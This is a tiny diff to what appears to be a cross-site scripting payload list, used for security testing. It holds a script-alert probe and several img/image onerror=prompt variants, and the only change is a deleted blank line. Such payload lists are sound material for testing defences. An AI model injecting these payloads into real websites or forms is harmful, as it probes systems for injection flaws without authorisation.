@@ -1,5 +1,4 @@
 <script>alert(1)</script>
-
 <image/src/onerror=prompt(8)>
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
